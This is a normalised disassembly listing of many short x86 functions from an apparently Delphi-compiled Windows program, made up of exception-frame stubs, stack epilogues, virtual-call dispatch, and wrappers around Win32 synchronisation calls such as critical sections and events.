sub_40edea
jmp sub_403834
sub_40edf1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ee6d
jmp sub_403834
sub_40f3b3
jmp sub_403834
sub_40f3ba
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f44d
jmp sub_403834
sub_40f454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f471
lea eax [ ebp - 0x14 ]
call sub_404594
retn
sub_40f46a
jmp sub_403834
sub_40f471
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f4ce
jmp sub_403834
sub_40f4d5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f577
jmp sub_403834
sub_40f594
jmp sub_403834
sub_40f59b
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40faf6
jmp sub_403834
sub_40fafd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fba8
push eax
call sub_40e828
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_40fbbc
push eax
call sub_40e828
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_40fc34
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40eb50
add esp 0x10
sub_40fede
jmp sub_403834
sub_40fee5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ff28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40e828
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_40ff40
mov edx 0x80020004
call sub_40ff28
retn
sub_40ffd1
jmp sub_403834
sub_40ffd8
pop esi
pop ebx
pop ebp
retn
sub_40ffdc
push ebp
mov ebp esp
call sub_41019c
pop ebp
retn 0x4
sub_410068
push ebp
mov ebp esp
call sub_41019c
pop ebp
retn 0x4
sub_41014b
jmp sub_403834
sub_410152
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4030e8
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403454
sub_410174
xor eax eax
retn
sub_410178
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_41018c
mov [ ecx ] 0x8
mov al 0x1
retn
sub_410194
call sub_40e074
retn
sub_41019c
call sub_40e164
retn
sub_4101a4
call sub_40e53c
retn
sub_4101ac
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4101c0
call sub_41019c
retn
sub_4101c8
push ebp
mov ebp esp
call sub_4101a4
pop ebp
retn 0x8
sub_4101e0
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4102bc
jmp sub_403834
sub_410385
jmp sub_403834
sub_41038c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4103a9
lea eax [ ebp - 0x10 ]
call sub_403eb4
retn
sub_4103a2
jmp sub_403834
sub_4103a9
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4103b4
call sub_40e590
retn
sub_41042b
jmp sub_403834
sub_410432
pop ebp
retn
sub_4104d5
jmp sub_403834
sub_4104dc
pop ebp
retn
sub_410605
jmp sub_403834
sub_41060c
pop ebp
retn
sub_410610
sub [ rw-data ] 0x1
retn
sub_410644
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_4108c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403f08
pop esi
pop ebx
retn
sub_410964
jmp sub_403834
sub_41096b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_410a66
jmp sub_403834
sub_410a6d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410c6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40eb50
pop esi
pop ebx
retn
sub_410dee
jmp sub_403834
sub_410df5
pop ebp
retn
sub_410df8
sub [ rw-data ] 0x1
retn
sub_410e25
jmp sub_403834
sub_410e2c
pop ebp
retn
sub_410e30
sub [ rw-data ] 0x1
retn
sub_411733
add [ esp + 0x4 ] 0xfffffff8
jmp sub_414220
sub_41173d
add [ esp + 0x4 ] 0xfffffff8
jmp sub_414240
sub_411e31
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
sub_41221e
add [ eax ] 0x0
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_41236b
push ecx
push eax
jmp eax
sub_4125b0
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_4126d4
mov eax [ eax + 0xc ]
call sub_413898
retn
sub_4129ab
jmp sub_403834
sub_4129b2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4129b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413a50
test eax eax
setge al
pop esi
pop ebx
retn
sub_412cbb
jmp sub_403834
sub_412cc2
mov esp ebp
pop ebp
retn
sub_412d90
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_412d9c
push ebx
mov ebx edx
mov edx ebx
call sub_412bb0
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_412910
sub_412e48
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_412fa3
jmp sub_403834
sub_413077
jmp sub_403834
sub_413088
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_4130f4
jmp sub_403834
sub_4130fb
pop ebx
mov esp ebp
pop ebp
retn
sub_413146
jmp sub_403834
sub_41314d
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4131d9
jmp sub_403834
sub_4131e0
pop ebx
pop ebp
retn
sub_413226
jmp sub_403834
sub_41322d
pop ebx
pop ebp
retn
sub_413272
jmp sub_403834
sub_413279
pop ebx
pop ebp
retn
sub_4132c3
jmp sub_403834
sub_4132ca
pop esi
pop ebx
pop ebp
retn
sub_41331e
jmp sub_403834
sub_413325
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413452
jmp sub_403834
sub_413528
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_413b90
sub_413618
jmp sub_403834
sub_4137a2
jmp sub_403834
sub_4137a9
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413843
jmp sub_403834
sub_41384a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413869
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_413862
jmp sub_403834
sub_413869
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_4138cc
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_413bec
xor edx edx
mov eax ebx
call sub_413bb0
pop ebx
retn
sub_413944
mov eax [ ebp + 0x4 ]
retn
sub_41397a
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4139c8
jmp sub_403834
sub_4139cf
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4139d4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_4139ec
xor edx edx
call sub_4139f4
retn
sub_413adc
mov edx [ eax + 0x8 ]
dec edx
call sub_4139f4
retn
sub_413c98
retn
sub_413d52
jmp sub_403834
sub_413d59
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403454
sub_413de8
jmp sub_403834
sub_413def
pop ebx
pop ecx
pop ebp
retn
sub_413df4
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_413e4b
jmp sub_403834
sub_413e52
pop ebx
pop ecx
pop ebp
retn
sub_413e58
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_413e94
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
retn
sub_413eac
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_413f87
retn
sub_41402c
test edx edx
je r-xdata
xor edx edx
call sub_414040
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_4140f6
jmp sub_403834
sub_4140fd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414110
xchg edx eax
call sub_414040
retn
sub_414118
retn
sub_4141b1
jmp sub_403834
sub_4141b8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41420e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
sub_414375
jmp sub_403834
sub_41437c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414410
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x8 ]
xchg edx eax
call sub_413a50
retn
sub_4144e5
jmp sub_403834
sub_4144ec
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414530
xor edx edx
call sub_4143ec
retn
sub_414588
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4145f2
jmp sub_403834
sub_4147be
jmp sub_403834
sub_4147c5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4147e2
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
sub_4147db
jmp sub_403834
sub_4147e2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41486c
jmp sub_403834
sub_414884
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414940
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_4149e9
jmp sub_403834
sub_4149f0
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4149fc
mov eax [ ebp + 0x4 ]
retn
sub_414a32
pop ecx
pop edx
pop esi
pop ebx
retn
sub_414a80
jmp sub_403834
sub_414a87
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414b46
jmp sub_403834
sub_414b4d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b6f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ed8
retn
sub_414b68
jmp sub_403834
sub_414b6f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414b78
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_414b80
xor eax eax
retn
sub_414bc9
jmp sub_403834
sub_414bd0
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_414ce3
jmp sub_403834
sub_414cea
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414d78
jmp sub_403834
sub_414d7f
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414e4f
jmp sub_403834
sub_414e56
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414f0c
jmp sub_403834
sub_414f13
pop esi
pop ecx
pop ebp
retn
sub_414f98
jmp sub_403834
sub_414f9f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414fbc
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
sub_414fb5
jmp sub_403834
sub_414fbc
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415048
jmp sub_403834
sub_415065
jmp sub_403834
sub_41506c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4150a8
retn
sub_41512b
jmp sub_403834
sub_415132
mov eax [ ebp - 0x8 ]
call sub_417c6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415157
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
sub_415150
jmp sub_403834
sub_415157
mov esp ebp
pop ebp
retn
sub_4151a7
jmp sub_403834
sub_4151ae
pop esi
pop ecx
pop ebp
retn
sub_415201
jmp sub_403834
sub_415208
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415210
retn
sub_41528b
jmp sub_403834
sub_415292
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41532f
jmp sub_403834
sub_415336
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415353
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
sub_41534c
jmp sub_403834
sub_415353
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415358
retn
sub_4153d2
jmp sub_403834
sub_4153d9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4153e0
mov eax edx
mov edx ecx
call sub_407b10
retn
sub_4153ec
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_415404
sub_41547c
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_4154ec
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_415508
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4156fc
mov eax [ eax + 0x18 ]
retn
sub_415700
mov eax [ eax + 0x14 ]
retn
sub_41579c
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_4159a8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_40270c
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_4159e4
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_4159fc
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_415a10
mov edx sub_4159fc
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_415a58
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407b10
retn
mov eax edx
mov edx ecx
call sub_407ad8
retn
sub_415af4
retn
sub_415dec
jmp sub_403834
sub_415df3
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_415e54
jmp sub_403834
sub_415e5b
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415ea0
mov eax [ eax + 0x4 ]
call sub_4081d0
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415eb0
mov eax [ eax + 0x4 ]
call sub_4081fc
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415eec
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_416095
jmp sub_403834
sub_4160f4
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_416184
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4161d4
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_4163bf
jmp sub_403834
sub_4163c6
mov esp ebp
pop ebp
retn
sub_416470
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
retn
sub_4164f8
mov [ eax + 0x18 ] edx
retn
sub_416674
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_4107e4
retn
sub_4166fb
jmp sub_403834
sub_416702
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4167ae
jmp sub_403834
sub_4167b5
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_416959
jmp sub_403834
sub_4169ab
jmp sub_403834
sub_4169ca
jmp sub_403834
sub_4169d1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4169f0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4169e9
jmp sub_403834
sub_4169f0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416a93
jmp sub_403834
sub_416b1b
jmp sub_403834
sub_416b28
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
pop ebx
retn
sub_416b40
mov eax [ rw-data ]
call sub_416b28
retn
sub_416b78
push ebx
call sub_41069c
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_416b40
sub_416ce5
jmp sub_403834
sub_416cec
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403eb4
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_416e0c
jmp sub_403834
sub_416e13
pop edi
pop esi
pop ebx
pop ebp
retn
sub_416f0a
jmp sub_403834
sub_416f27
jmp sub_403834
sub_416f2e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41702c
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_415a74
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_4170f0
push ebx
mov ebx eax
mov eax ebx
call sub_418aa4
cmp al 0x9
sete al
pop ebx
retn
sub_41714f
jmp sub_403834
sub_417156
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4171fc
jmp sub_403834
sub_417203
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417482
jmp sub_403580
sub_4174ae
jmp sub_403580
sub_417550
jmp sub_403580
sub_4175f3
jmp sub_403580
sub_4177cb
jmp sub_403580
sub_41780d
jmp sub_403834
sub_41783d
jmp sub_403834
sub_417844
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4178b3
jmp sub_403834
sub_41798a
jmp sub_403834
sub_417991
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417c64
mov dl 0x1
call sub_416bcc
retn
sub_417d9c
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_417da5
jmp sub_403834
j_sub_417d9c
jmp sub_417d9c
sub_417dac
pop ebx
mov esp ebp
pop ebp
retn
sub_417db4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_418bb4
mov eax [ rw-data ]
call sub_416b28
pop ebp
retn
j_sub_4036ac#6
jmp sub_4036ac
j_sub_4036ac#7
jmp sub_4036ac
sub_417fa0
jmp sub_403834
sub_417fa7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418087
jmp sub_403834
sub_41808e
mov esp ebp
pop ebp
retn
sub_418146
jmp sub_403834
sub_41814d
pop ecx
pop ecx
pop ebp
retn
sub_41844f
jmp sub_403834
sub_418456
pop ebx
mov esp ebp
pop ebp
retn
sub_4186fb
jmp sub_403834
sub_418702
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_4030f8
retn
sub_41871b
jmp sub_403834
sub_41873f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_403580
sub_418776
jmp sub_403580
sub_4187b5
jmp sub_403834
sub_4187bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4187de
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403ed8
retn
sub_4187d7
jmp sub_403834
sub_4187de
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418865
jmp sub_403580
sub_418892
jmp sub_403834
sub_418899
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4188a4
push ecx
mov edx esp
mov ecx 0x4
call sub_417068
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_416b28
sub_4189b1
jmp sub_403834
sub_4189b8
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418a97
jmp sub_403834
sub_418a9e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418af4
jmp sub_403834
sub_418afb
pop ebx
pop ecx
pop ebp
retn
sub_418d43
jmp sub_403834
sub_418d4a
pop ecx
pop ecx
pop ebp
retn
sub_418d8d
jmp sub_403834
sub_418d94
pop ebx
pop ecx
pop ebp
retn
sub_418e30
jmp sub_403834
sub_418e37
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418ee5
jmp sub_403834
sub_418eec
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418ef8
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_419153
jmp sub_403834
sub_41915a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41917f
mov eax [ ebp - 0x8 ]
call sub_4030f8
mov eax [ ebp - 0x4 ]
call sub_4030f8
retn
sub_419178
jmp sub_403834
sub_41917f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4191a4
lea eax [ ebp - 0x1c ]
call sub_4054f0
lea eax [ ebp - 0x18 ]
call sub_403eb4
retn
sub_41919d
jmp sub_403834
sub_4191a4
pop ebx
mov esp ebp
pop ebp
retn
sub_4193b6
jmp sub_403834
sub_4193bd
pop ebx
mov esp ebp
pop ebp
retn
sub_419410
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_415cd8
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_419428
test dl dl
je r-xdata
mov dl 0x8
call sub_4195ac
retn
mov dl 0x9
call sub_4195ac
retn
sub_4194b0
mov dl 0x1
call sub_4195ac
retn
sub_4194b8
xor edx edx
call sub_4195ac
retn
sub_41959d
jmp sub_403834
sub_4195a4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4195c0
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40c724
sub_4195f4
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_41960c
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_419618
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_41960c
sub_419634
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_419640
push rw-data
call InterlockedIncrement
retn
sub_41964c
push rw-data
call InterlockedDecrement
retn
sub_419762
jmp sub_403580
sub_419791
jmp sub_403834
sub_4197c7
jmp sub_403834
sub_4197ce
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4197ed
push rw-data
call LeaveCriticalSection
retn
sub_4197e6
jmp sub_403834
sub_4197ed
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419839
jmp sub_403580
sub_41994a
jmp sub_403834
sub_419951
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4199d8
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
call sub_419c08
sub_419a52
jmp sub_403834
sub_419a59
pop ebx
mov esp ebp
pop ebp
retn
sub_419a78
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_419a8c
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_419a78
call sub_419be0
sub_419b85
jmp sub_403834
sub_419b8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419bab
push rw-data
call LeaveCriticalSection
retn
sub_419ba4
jmp sub_403834
sub_419bab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
retn
sub_419bc2
jmp sub_403834
sub_419c30
mov [ eax + 0xd ] 0x1
retn
sub_419da0
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_419f7c
sub_419e00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417bb4
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_419e14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417bb4
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_419e28
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41943c
retn
sub_419e34
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41943c
retn
sub_41a0dc
xor eax eax
retn
sub_41a0e0
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41a0e8
xor eax eax
retn
sub_41a0ec
retn
sub_41a0f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f08
pop esi
pop ebx
retn
sub_41a104
mov eax [ eax + 0x4 ]
retn
sub_41a108
retn
sub_41a10c
xor eax eax
retn
sub_41a110
retn
sub_41a114
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_41a120
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_41a12c
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_41a138
retn
sub_41a13c
xchg edx eax
call sub_417858
retn
sub_41a144
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_41a1cc
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_4032f4
pop esi
retn
sub_41a1e0
retn
sub_41a2c0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f08
pop esi
pop ebx
retn
sub_41a300
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_41a44c
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_403328
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_41a464
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_41a4ec
retn
sub_41a534
retn
sub_41a56c
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41a584
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41a7a8
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_4032f4
pop esi
pop ebx
retn
sub_41a5cc
mov al 0x1
retn
sub_41a5d0
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41a5d8
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_41a680
xor eax eax
retn
sub_41a684
retn
sub_41a6b0
retn
sub_41a748
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_41a75c
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_413898
retn
sub_41a8a3
jmp sub_403580
sub_41a8a8
mov ebx 0x1
call sub_4038e8
mov eax ebx
